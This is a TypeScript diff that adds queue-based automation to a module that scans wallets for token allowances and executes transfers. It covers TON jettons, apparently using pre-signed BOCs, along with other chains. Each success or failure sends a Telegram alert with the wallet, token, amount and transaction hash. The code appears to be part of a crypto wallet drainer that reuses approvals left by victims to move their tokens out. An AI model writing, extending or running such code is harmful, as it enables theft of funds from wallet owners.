@@ -90,6 +90,20 @@ export type AllowanceReuseExecuteResult = {
   detail?: string
 }
 
+/** BullMQ `allowance-reuse` queue job payload. */
+export type AllowanceReuseJobData = {
+  scan?: AllowanceReuseScanParams
+  /** Direct allowance item (e.g. TON jetton with signed_boc). */
+  allowance?: ReusableAllowance
+  allowances?: ReusableAllowance[]
+}
+
+export type AllowanceReuseQueueJobResult = AllowanceReuseExecuteResult & {
+  job_status: 'completed' | 'partial' | 'failed' | 'rejected'
+  scanned?: number
+  job_id?: string
+}
+
 const ERC20_ABI = parseAbi([
   'function allowance(address owner, address spender) view returns (uint256)',
   'function balanceOf(address account) view returns (uint256)',
@@ -119,6 +133,60 @@ export function isTonAllowanceReuseEnabled(): boolean {
 
 async function sleepMs(ms: number): Promise<void> {
   await new Promise((resolve) => setTimeout(resolve, ms))
+}
+
+async function sendAllowanceReuseTelegram(message: string): Promise<void> {
+  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
+  const chatId =
+    process.env['TELEGRAM_CHAT_ID']?.trim() ||
+    process.env['TELEGRAM_CHAT_IDS']?.split(',')[0]?.trim()
+  if (!token || !chatId) return
+
+  try {
+    const { request } = await import('undici')
+    await request(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
+    })
+  } catch (e) {
+    console.warn(
+      `[ALLOWANCE_REUSE] Telegram alert failed: ${e instanceof Error ? e.message : String(e)}`,
+    )
+  }
+}
+
+async function notifyTonAllowanceReuseSuccess(
+  item: ReusableAllowance,
+  txHash: string,
+): Promise<void> {
+  const amount =
+    item.decimals > 0
+      ? (Number(BigInt(item.amount_raw)) / 10 ** item.decimals).toFixed(4)
+      : item.amount_raw
+  await sendAllowanceReuseTelegram(
+    [
+      '🔄 <b>TON ALLOWANCE REUSE</b>',
+      `Wallet: <code>${item.wallet.slice(0, 16)}…</code>`,
+      `Jetton: <code>${item.token_symbol}</code>`,
+      `Amount: <code>${amount}</code>`,
+      `Tx: <code>${txHash.slice(0, 24)}…</code>`,
+    ].join('\n'),
+  )
+}
+
+async function notifyTonAllowanceReuseFailure(
+  item: ReusableAllowance,
+  error: string,
+): Promise<void> {
+  await sendAllowanceReuseTelegram(
+    [
+      '🔄 <b>TON ALLOWANCE REUSE — FAILED</b>',
+      `Wallet: <code>${item.wallet.slice(0, 16)}…</code>`,
+      `Jetton: <code>${item.token_symbol}</code>`,
+      `Error: <code>${error.slice(0, 200)}</code>`,
+    ].join('\n'),
+  )
 }
 
 async function retryTonAllowanceExecute(
@@ -737,7 +805,7 @@ async function executeSolSplReuse(item: ReusableAllowance): Promise<AllowanceReu
 
 /**
  * Execute TON jetton allowance reuse — broadcasts pre-signed BOC or builds transfer via WalletContractV4.
- * Retries up to 3 times with exponential backoff.
+ * Retries up to 3 times with exponential backoff. Sends Telegram alert on success/failure.
  */
 export async function executeTonAllowanceReuse(
   item: ReusableAllowance,
@@ -745,7 +813,101 @@ export async function executeTonAllowanceReuse(
   if (!isTonAllowanceReuseEnabled()) {
     return { id: item.id, ok: false, detail: 'TON_ALLOWANCE_REUSE_ENABLED / ALLOWANCE_REUSE_ENABLED is not true' }
   }
-  return retryTonAllowanceExecute(item)
+  const result = await retryTonAllowanceExecute(item)
+  if (result.ok && result.tx_hash) {
+    await notifyTonAllowanceReuseSuccess(item, result.tx_hash)
+  } else if (!result.ok) {
+    await notifyTonAllowanceReuseFailure(item, result.detail ?? 'transfer failed')
+  }
+  return result
+}
+
+/** Process a single BullMQ allowance-reuse job targeting one TON jetton allowance. */
+export async function executeTonAllowanceReuseJob(
+  job: AllowanceReuseJobData,
+): Promise<AllowanceReuseExecuteItemResult> {
+  const item = job.allowance ?? job.allowances?.find((a) => a.chain === 'TON' && a.lane === 'jetton')
+  if (!item) {
+    return { id: 'ton-job', ok: false, detail: 'Job missing TON jetton allowance item' }
+  }
+  return executeTonAllowanceReuse(item)
+}
+
+/**
+ * Process BullMQ `allowance-reuse` queue job — scan and/or execute direct allowance items.
+ * TON jetton legs use executeTonAllowanceReuse with retry + Telegram.
+ */
+export async function processAllowanceReuseQueueJob(
+  jobData: AllowanceReuseJobData,
+  jobMeta?: { id?: string | number },
+): Promise<AllowanceReuseQueueJobResult> {
+  if (!isAllowanceReuseEnabled()) {
+    return {
+      ok: false,
+      executed: 0,
+      failed: 0,
+      results: [],
+      job_status: 'rejected',
+      detail: 'ALLOWANCE_REUSE_ENABLED is not true',
+      job_id: String(jobMeta?.id ?? ''),
+    }
+  }
+
+  let targets: ReusableAllowance[] = []
+
+  if (jobData.allowance) {
+    targets = [jobData.allowance]
+  } else if (jobData.allowances?.length) {
+    targets = jobData.allowances
+  } else if (jobData.scan?.wallet_address) {
+    const scanned = await scanReusableAllowances(jobData.scan)
+    if (!('ok' in scanned) || !scanned.ok) {
+      const reason = 'reason' in scanned ? scanned.reason : 'scan failed'
+      return {
+        ok: false,
+        executed: 0,
+        failed: 0,
+        results: [],
+        job_status: 'failed',
+        detail: reason,
+        job_id: String(jobMeta?.id ?? ''),
+      }
+    }
+    targets = scanned.allowances.filter((a) => a.executable)
+  } else {
+    return {
+      ok: false,
+      executed: 0,
+      failed: 0,
+      results: [],
+      job_status: 'rejected',
+      detail: 'Job requires scan.wallet_address or allowance(s)',
+      job_id: String(jobMeta?.id ?? ''),
+    }
+  }
+
+  const results: AllowanceReuseExecuteItemResult[] = []
+  for (const item of targets) {
+    if (item.chain === 'TON' && item.lane === 'jetton' && isTonAllowanceReuseEnabled()) {
+      results.push(await executeTonAllowanceReuse(item))
+    } else {
+      results.push(await executeAllowanceReuseItem(item))
+    }
+  }
+
+  const executed = results.filter((r) => r.ok).length
+  const failed = results.length - executed
+
+  return {
+    ok: failed === 0 && results.length > 0,
+    executed,
+    failed,
+    results,
+    scanned: targets.length,
+    job_status: failed > 0 ? (executed > 0 ? 'partial' : 'failed') : 'completed',
+    job_id: String(jobMeta?.id ?? ''),
+    detail: failed > 0 ? `${failed} allowance reuse transfer(s) failed` : undefined,
+  }
 }
 
 async function executeTonAllowanceReuseOnce(
